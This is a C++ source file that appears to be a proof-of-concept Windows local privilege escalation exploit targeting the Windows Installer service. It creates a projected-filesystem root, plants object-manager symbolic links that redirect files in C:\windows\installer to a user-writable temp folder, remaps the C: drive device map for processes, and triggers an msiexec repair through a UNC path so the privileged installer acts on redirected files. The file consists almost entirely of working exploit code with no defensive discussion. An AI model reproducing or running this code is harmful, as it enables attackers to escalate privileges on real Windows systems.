
#include <exploitLib/exploitLib.h>
#include <exploitLib/primitives.h>
#include "projfs.h"
using namespace x::literalNS;
 
int main(int argc, char* args[])
try
{
   makeVirtualRoot(L"C:\\aax\\");
   getchar();

   if (argc <= 1) { std::wcout << L"Usage: " << args[0] << L" msifilename"; return 0; }

   x::unistr msiFile{ args[1] };

   // create object directories and setup object symlinks
   x::reflectedRootFolder  root{ L"c:\\" };
   x::reflectedFolder windows{ L"C:\\windows"s };
   x::reflectedFolder install{ L"C:\\windows\\installer" };
   root.addLink("windows", windows);
   windows.addLink("installer", install);
   install.addLink(msiFile, L"\\??\\Global\\c:\\temp\\" + msiFile);
   install.addLink(L"inprogressinstallinfo.ipi", "\\??\\Global\\C:\\Windows\\Installer\\inprogressinstallinfo.ipi");

   // get msi file from installer dir
   std::vector<std::wstring> msifiles;
   for (auto& f : x::file{ "C:\\windows\\installer"_p }.enumDir())
   {
      if (f.ends_with(L".msi"))
      {
         msifiles.emplace_back(f);
      }
   }

   // for the "normal" device map
   auto global = x::objdir::open{ "\\GLOBAL??" };
   getchar();

   // redirect user drive
   x::symlink redirectCDrive{ L"\\??\\C:" , root };

   // set existing process device map so they continue running undisturbed
   x::process::SetProcessDeviceMap(global);
   for (auto& p : x::process::getAllProcesses())
   {
      try{
         x::process::SetProcessDeviceMap(global,OpenProcess( PROCESS_ALL_ACCESS,false, p.th32ProcessID ) );
      }
      catch (...) {}
   }

   // run process through UNC path with normal device map
   auto msiProc = x::process::execute( L"\\\\localhost\\c$\\windows\\system32\\msiexec.exe", L"/qn /l*vx! \\\\localhost\\c$\\temp\\msiexec.log /fm c:\\windows\\installer\\"s + msiFile,L"",true);
   x::process::SetProcessDeviceMap(global, msiProc.process );
   
   ULONG prev;
   NtResumeThread(msiProc.thread, &prev);

   WaitForSingleObject(msiProc.process, INFINITE );

   // wait for signal it's okay to cleanup & exit
   getchar();

   // auto cleanup on exit

   return 0;
}
catch (wil::ResultException& e)
{
   std::wcout << _com_error{ (HRESULT)RtlNtStatusToDosError(e.GetErrorCode()) }.ErrorMessage() << std::endl;
   std::wcout << e.what() << std::endl;
}
catch (std::exception& e)
{
   std::wcout << e.what() << std::endl;
}